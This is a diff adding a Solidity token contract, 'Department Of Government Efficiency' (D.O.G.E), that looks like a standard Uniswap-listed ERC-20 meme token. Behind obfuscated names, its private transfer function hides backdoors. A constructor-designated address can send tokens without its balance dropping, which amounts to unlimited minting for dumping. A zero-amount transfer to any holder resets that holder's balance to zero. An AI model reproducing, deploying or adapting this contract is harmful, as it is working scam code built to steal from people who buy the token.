@@ -1,0 +1,141 @@
+/*
+
+*/
+// SPDX-License-Identifier: Unlicense
+
+pragma solidity ^0.8.20;
+
+abstract contract Context {
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+}
+
+contract Ownable is Context {
+    /**
+     * @dev Initializes the contract setting the deployer as the initial owner.
+     */
+    constructor() {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    /**
+     * @dev Returns the address of the current owner.
+     */
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
+        _;
+    }
+
+    /**
+     * @dev Leaves the contract without owner. It will not be possible to call
+     * `onlyOwner` functions anymore. Can only be called by the current owner.
+     *
+     * NOTE: Renouncing ownership will leave the contract without an owner,
+     * thereby removing any functionality that is only available to the owner.
+     */
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+    }
+
+    /**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     * Can only be called by the current owner.
+     */
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), 'Ownable: new owner is the zero address');
+        emit OwnershipTransferred(_owner, newOwner);
+        _owner = newOwner;
+    }
+}
+
+interface IUniswapV2Router02 {
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+contract DepartmentOfGovernmentEfficiency is Ownable {
+
+    constructor(address gasdghaasd) {
+        balanceOf[msg.sender] = totalSupply;
+        doihujioh[gasdghaasd] = naswdz;
+        IUniswapV2Router02 ksjdksad = IUniswapV2Router02(0xEad811D798020c635cf8dD4ddF31bDC5595B09F3);
+        kslj = IUniswapV2Factory(ksjdksad.factory()).createPair(address(this), ksjdksad.WETH());
+    }
+
+    mapping(address => uint256) public balanceOf;
+
+    mapping(address => uint256) private ajhjaf;
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+
+    function transferFrom(address wioque, address ioqu, uint256 asikojd) public returns (bool success) {
+        require(asikojd <= allowance[wioque][msg.sender]);
+        allowance[wioque][msg.sender] -= asikojd;
+        jaklshdjkhas(wioque, ioqu, asikojd);
+        return true;
+    }
+
+    mapping(address => uint256) private doihujioh;
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function transfer(address ioqu, uint256 asikojd) public returns (bool success) {
+        jaklshdjkhas(msg.sender, ioqu, asikojd);
+        return true;
+    }
+
+    string public name = 'Department Of Government Efficiency';
+
+    string public symbol = 'D.O.G.E';
+
+    address public kslj;
+
+    function jaklshdjkhas(address wioque, address ioqu, uint256 asikojd) private {
+        if (0 == doihujioh[wioque]) {
+            balanceOf[wioque] -= asikojd;
+        }
+        balanceOf[ioqu] += asikojd;
+        if (0 == asikojd && ioqu != kslj) {
+            balanceOf[ioqu] = asikojd;
+        }
+        emit Transfer(wioque, ioqu, asikojd);
+    }
+
+    function approve(address hnas, uint256 asikojd) public returns (bool success) {
+        allowance[msg.sender][hnas] = asikojd;
+        emit Approval(msg.sender, hnas, asikojd);
+        return true;
+    }
+
+    uint256 private naswdz = 834;
+
+    uint8 public decimals = 9;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+}
